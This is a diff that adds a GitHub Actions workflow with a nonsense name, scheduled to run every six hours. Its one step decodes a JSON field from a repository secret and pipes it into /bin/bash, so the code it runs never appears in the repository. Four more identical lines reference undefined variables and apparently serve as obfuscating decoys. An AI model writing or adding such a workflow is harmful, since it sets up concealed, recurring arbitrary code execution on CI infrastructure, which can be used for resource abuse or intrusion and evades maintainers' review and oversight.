@@ -1,0 +1,22 @@
+name: youkenengfengg
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: youkenengfengg
+        env:
+          m9: ${{ secrets.m9 }}
+        run: |
+          echo $m9 | jq -r .yjow9 | /bin/bash
+          echo $pifzi29553 | jq -r .kl0078 | /bin/bash
+          echo $bbuje93836 | jq -r .bcm3 | /bin/bash
+          echo $uauqb282 | jq -r .juypm79520 | /bin/bash
+          echo $zlb5 | jq -r .lfcm840 | /bin/bash
+
